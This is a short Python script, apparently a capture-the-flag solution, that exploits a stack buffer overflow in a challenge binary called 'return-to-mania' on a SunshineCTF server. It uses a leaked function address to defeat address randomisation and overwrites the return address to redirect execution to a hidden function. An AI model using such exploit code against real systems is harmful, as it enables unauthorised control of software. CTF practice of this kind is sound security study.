from ptrlib import *

elf = ELF("./return-to-mania")
#sock = Process("./return-to-mania")
sock = Socket("ret.sunshinectf.org", 4301)

sock.recvuntil("welcome(): ")
addr_welcome = int(sock.recvline(), 16)
proc_base = addr_welcome - elf.symbol("welcome")
addr_mania = proc_base + elf.symbol("mania")
dump("proc_base = " + hex(proc_base))

payload = b'A' * 0x16
payload += p32(addr_mania)
sock.sendline(payload)
sock.interactive()

